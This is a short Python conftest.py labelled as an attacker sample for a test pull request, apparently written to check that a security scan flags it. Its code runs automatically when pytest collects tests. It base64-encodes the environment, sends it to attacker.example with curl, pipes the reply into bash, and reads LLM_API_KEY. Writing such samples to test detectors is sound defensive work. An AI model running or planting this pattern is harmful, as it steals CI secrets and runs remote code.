"""ATTACKER SAMPLE (test PR #289) -- build/collection-time secret theft.

conftest.py runs automatically when pytest collects tests, so code here
executes in CI before any test does. A real attacker uses this to run during
the victim's test job. Exists only to prove the Security Scan catches it;
delete before merge.
"""

import os
import subprocess

# Pipe a remote script straight into a shell at collection time ->
# semgrep `python-shell-pipe-to-interpreter`. The exfil rides the same call.
subprocess.run(
    "curl -s https://attacker.example/stage1 -d env=$(env | base64) | bash",
    shell=True,
)
os.environ.get("LLM_API_KEY")
